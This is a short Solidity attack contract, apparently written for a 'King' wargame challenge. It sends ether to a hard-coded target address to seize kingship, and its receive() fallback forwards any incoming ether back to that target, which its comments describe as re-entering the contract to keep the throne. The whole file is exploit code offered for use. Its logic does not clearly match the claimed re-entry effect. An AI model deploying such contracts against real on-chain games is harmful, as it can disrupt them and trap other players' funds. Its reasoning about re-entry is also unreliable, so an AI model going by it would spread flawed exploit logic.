pragma solidity ^0.8.0;

contract BeatKing {
    // Function to call the target contract and become the king
    function becomeKing() external payable {
        (bool sent, ) = address(0x9FC19EFa240bB7700336d69b4E7cA1839313067B)
            .call{value: msg.value}("");
        require(sent, "Failed to send Ether");
    }

    // Fallback function to re-enter the target contract
    receive() external payable {
        // Re-enter the target contract to set the king again
        (bool sent, ) = address(0x9FC19EFa240bB7700336d69b4E7cA1839313067B)
            .call{value: msg.value}("");
        require(sent, "Failed to send Ether");
    }
}
